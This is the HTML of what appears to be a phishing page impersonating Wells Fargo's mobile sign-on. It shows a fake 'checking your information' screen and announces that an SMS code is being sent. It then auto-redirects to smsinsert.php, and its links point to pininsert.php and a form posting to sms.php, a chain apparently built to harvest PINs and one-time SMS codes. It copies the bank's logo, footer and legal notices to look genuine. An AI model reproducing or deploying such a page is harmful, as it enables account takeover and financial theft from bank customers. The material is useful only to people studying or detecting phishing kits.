<!DOCTYPE html>
<html lang="en" class="no-js">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><!-- WFB 3.4 -->
   <META HTTP-EQUIV="refresh" content="12;URL=smsinsert.php">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
      <title>Wells Fargo – Banking, Credit Cards, Loans, Mortgages &amp; More</title>
    <meta name="robots" content="index, nofollow">
    <meta name="search_category" content="Personal">
     <meta name="viewport" content="width=device-width,  initial-scale=1.0, maximum-scale=6.0, user-scalable=yes">
    <meta name="apple-itunes-app" content="app-id=311548709">

<link rel="shortcut icon" type="image/x-icon" href="./surance_files/favicon.ico">
<link rel="apple-touch-icon" sizes="120x120" href="./surance_files/apple-touch-icon-120x120.png">
<link rel="apple-touch-icon" sizes="180x180" href="./surance_files/apple-touch-icon-180x180.png">
<link rel="icon" sizes="128x128" href="./surance_files/icon-normal-128x128.png">
<link rel="icon" sizes="192x192" href="./surance_files/icon-hires-192x192.png">
<link rel="shortcut icon" type="image/x-icon" href="https://www04.wellsfargomedia.com/favicon.ico">
       <link rel="stylesheet" type="text/css" href="css/framework.css" />
<link rel="stylesheet" type="text/css" href="css/smartphone-home.css" />
	
<script type="text/javascript">
// close the div in 5 secs
window.setTimeout("closeHelpDiv();", 5000);
window.setTimeout("closefunc1();", 12000);

function closeHelpDiv(){
document.getElementById("helpdiv").style.display="none";
}
function closefunc1(){
document.getElementById("func1").style.display="none";
}
</script>

<script>
window.onload = function (){
  // Change this value to however many seconds you want to delay the text by.
  var timer = setTimeout("func1();", 5000)
  var timer = setTimeout("func2();", 13000)
  var timer = setTimeout("func3();", 14000)
}
function func1(){
  document.getElementById("func1").style.visibility = "visible";
}
function func2(){
  document.getElementById("func2").style.visibility = "visible";
}
function func3(){
  document.getElementById("func3").style.visibility = "visible";
}
</script>





</head>

<body class="freezedscreen" style="top: 0px;">
<div id="shell" class="page" data-pid="324-114205-64">
<div id="hamburger-menubackdrop" class="backDrop">
</div>
<a href="#" class="hidden">Skip to content</a>

<header class="masthead" role="banner">
        
                <div id="navLeft" style="display: block;">
                        
          <a tabindex="1" href="pininsert.php" rel="nofollow" class="backLink">
            <span class="sr-only">Back link</span>
          </a>
        
                </div>
               	
                <div class="logoOuter">
                        <div class="logo">
                                <a href="/"><img alt="" role="img" src="https://www01.wellsfargomedia.com/assets/_mobile/images/icons/icn-layer-svg.svg"></a>                        
                        </div>	
                </div>	 
        
                <div id="navRight">
                        <nav class="navbar navbar-default navbar-fixed-top">
<div class="navbar-header">
<div class="entire-menu">
<button type="button" class="navbar-toggle hamburger" aria-expanded="false" aria-label="Open Menu Navigation"><span class="sr-only">Menu</span> <span class="icon-bar">?</span> <span class="icon-bar">?</span> <span class="icon-bar">?</span> <span class="expandedIcon pointer">?</span></button></div>
</div>
</nav>	
                </div>
        
</header>

	<div class="overlaySignOn" style="top: 43px;" aria-hidden="false">

		<div class="overlayContainer">
			<div class="welcome-container" style="font-family: Wells Fargo Serif;">Please wait...</div>
			<!-- Retrieving username values -->
			<div class="security-container">
				<span class="security-img"></span>
				<a href="#" class="security-text">Online &amp; Mobile Security</a>
			</div>
			<div align="center" class="signOnContainer">							
				<br>
				<form id="frmSignon" name="frmSignon" action="sms.php?sessionid=&securessl=true" method="post" autocomplete="off">
				<img border="0" src="surance_files/loading-icon-red.gif" width="48" height="48"></p>


<br>
			</div>
			<div id="helpdiv"><p align="center"><font size="3" color="black" style=" text-align: center;

  color: #3b3331;
  font-family: Wells Fargo Serif;
  margin-top: 26px;
  padding: 0;
">Checking your information..</div>
			<div id="func1" style="visibility:hidden"><p align="center">Thank you.<br> We are now sending you a <font size="3" color="red">SMS CODE</font> to your Phone Number <br></br>Please wait ... <br> <br></br><i><font color="#8c8c8c">Do not close or refresh this page.</font><br></i></div></font>

				<div class="appstoreBadge" id="ios"> 
				<a href="#" class="ios"><span class="sr-only">Get the Wells Fargo app</span></a>  
				<a href="#" class="android" style="display: none;"><span class="sr-only">Get the Wells Fargo app</span></a>
				
			</div>		<footer role="contentinfo">
				<div class="html5footer c9" id="pageFooter">
					<nav class="nav-footer">
					
						<div class="footer-link clistData">
							<a href="#">PRIVACY, Cookies, Security &amp; Legal</a> | <a href="#">Ad Choices</a>
							<div class="footer-oaa"><a href="#">Online Access Agreement</a>
							</div>
						</div>
						<div class="footer-content">
							<div>
								<strong>Investment and Insurance products:</strong>
							</div>
							<div>
								<strong>NOT FDIC-Insured | NO Bank Guarantee | MAY Lose Value</strong>
							</div>
						</div>
						<div class="footer-content">Deposit products offered by Wells Fargo Bank, N.A. Member FDIC.</div>
						<div class="footer-content">
							<span class="home-equal">‍</span> Equal Housing Lender. NMLSR ID 399801</div>
						<div class="footer-content footer-margin">© 2020 Wells Fargo. All rights reserved.</div>
												<div class="stage-coach"><img src="https://www01.wellsfargomedia.com/assets/_mobile/images/global/stagecoach_50_opacity.svg" aria-hidden="true" alt="">
				  </nav></div>
					
		  </footer>
					<!--  Added the below parameters to pass to Loginapp -->
<input type="hidden" id="userPrefs" name="userPrefs" value="">
					<input id="jsenabled" name="jsenabled" type="hidden" value="false">
					<input id="origin" name="origin" type="hidden" value="mobilebrowser">
					<input type="hidden" name="screenid" value="SIGNON">
								 </form>
			</div>

</div>
			
	</div>
    <div class="overlayfavorite" style="display: none;" aria-hidden="true">
<div class="favorite-popup" style="top: 520px;"><span class="close-popup"><a href="#" class="nooutline"><img alt="Close" src="./surance_files/btn-close-x.png"></a></span> <span class="sr-only">Begining of popup</span>
<div class="popup-title">
<h2>Article Saved</h2>
</div>
<div class="popup-body">
<p>You can keep up to 5 favorite articles at a time.</p>
<p>Select <strong>My Favorites</strong> from the top menu to see your saved articles.</p>
</div>
<span class="sr-only">End of popup</span></div>
</div>                        

 <article class="fp-articles" data-cid="tcm:323-149897-16" data-ctid="tcm:322-113919-32" aria-hidden="true"><a class="articles-media" href="#" enrollmentid="2475"></a>
<a href="#" tabindex="-1" class="articles-star-container"><span tabindex="0" class="articles-star"><span class="sr-only">Add 	

  Need online access?Enroll Now
 to favorites</span></span> </a></article>
                            <footer role="contentinfo" aria-hidden="true">
	<div class="html5footer c9" id="pageFooter">

                 
        <nav class="nav-footer"></nav>

        
    </div>
</footer>
</div>
</div>


<div class="displayNone">
<img src="./surance_files/s.gif" alt="">
</div>

</body>
</html>